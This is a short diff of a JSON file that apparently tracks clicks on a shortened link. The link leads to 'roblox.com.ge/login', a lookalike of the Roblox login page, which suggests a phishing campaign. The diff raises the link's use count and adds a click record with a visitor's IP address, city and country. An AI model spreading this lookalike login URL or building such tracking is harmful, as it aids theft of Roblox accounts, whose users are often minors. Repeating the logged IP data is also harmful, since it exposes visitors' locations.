@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1437,
+    "useCount": 1438,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11664,6 +11664,14 @@
         "city": "Koronadal",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777431612412,
+        "ip": "104.63.96.67",
+        "country": "United States",
+        "city": "Pasadena",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
